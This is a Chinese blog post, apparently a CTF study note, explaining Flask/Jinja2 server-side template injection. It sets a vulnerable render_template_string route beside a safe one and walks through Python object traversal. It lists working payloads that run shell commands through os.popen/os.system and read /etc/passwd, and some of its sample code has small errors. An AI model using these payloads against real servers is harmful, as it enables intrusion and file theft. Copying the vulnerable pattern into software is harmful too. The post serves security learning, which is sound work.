---
title: Flask模板注入
date: 2020-04-23 09:42:01
updated: 2020-04-23 09:42:01
categories: web
---



在攻防世界做到一道涉及模板注入的题<a href=" https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5408&page=1" target="_blank">Web_python_template_injection</a>，简单了解了一下模板注入<!--more-->

# 基础知识

`模板`可以理解为是一段固定好格式，并等着你来填充信息的文件，`模板注入`就是指将一串指令代替变量传入模板中让它执行

先了解了一下装饰器的概念

**装饰器**:  简单讲就是在一个函数内部定义另外一个函数,然后返回一个新的函数,即动态的给一个对象添加额外的职责。比如有一个函数func(a, b)，它的功能是求a,b的差值，我们现在想对函数功能再装饰下，求完差值后再取绝对值，但是不能在func函数内部实现，这时候就需要装饰器函数了，比如func= decorate(func)函数，将func函数作为参数传递给decorate函数，由decorate来丰富func函数，丰富完成后再返回给func,此时func的功能就丰富了。

`@` 用做函数的修饰符，可以在模块或者类的定义层内对函数进行修饰

```
def decorate(func):
    def inner(a, b):
        ret = func(a, b):
        return abs(ret)
    return inner
 @decorate
 def sub(a, b):
    return a-b
    
 print sun(3,4)
 
 =>1
```



**@app.route**

app.route装饰器作用是把函数和URL绑定

```
from flask import flask 
@app.route('/index/')
def hello_word():
    return 'hello word'
```

> 访问`http://url/index`的时候，flask会返回`Hello World`



**渲染**

- render_template      用来渲染一个指定的文件的
- render_template_string      用来渲染一个字符串



**模板**

Flask使用Jinja2渲染引擎，以`{{}}`作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式

模板引擎会对输入变量进行编码转义：

错误使用：

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
 return render_template_string(html)
```

上面这段代码直接将用户输入作为了模板，不会经过转义和过滤的步骤，我们在传入`code`时，可以用`{{}}`来包裹代码，以替代本应时参数的`id`

> http://url/?id={{代码}}



正确使用：

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```



# 注入

通过Python对象的继承，用魔术方法一步步找到可利用的方法去执行。即找到父类`<type 'object'>`–>寻找子类–>找关于命令执行或者文件操作的模块

> os.system  退出状态码
> os.popen    以file形式返回输出内容

**对象的魔术方法：**

```php
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```



**步骤**

```
#测试是否存在模板注入
>>>{{1+1}}
[构造简单的payload，看服务器是否有回显]

#获取''字符串的所属对象
>>> ''.__class__
<class 'str'>

#获取str类的父类
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)

#获取object类的所有子类
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>...

 #找到所需的类在列表第几位（从第0位开始）
 >>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()
 [ popen('ls').read(),意思是得到ls的结果并读取给变量，因此它会把当前目录所有文件都打印在我们的网页上]

注：for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i 
可用来列举类

 #读取文件内容
 >>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
 
```

```
常用payload:
>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
```

包含os模块的类：

```
<class 'site._Printer'>
<class 'site.Quitter'>
```

# reference

https://zhuanlan.zhihu.com/p/26724125

https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584#0

https://www.jianshu.com/p/b6f1aea3a2eb

https://blog.csdn.net/zss192/article/details/104200493



------

**补充下：**
内置函数：get_flashed_messages(), url_for()

url_for()
一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。

get_flashed_messages()
返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。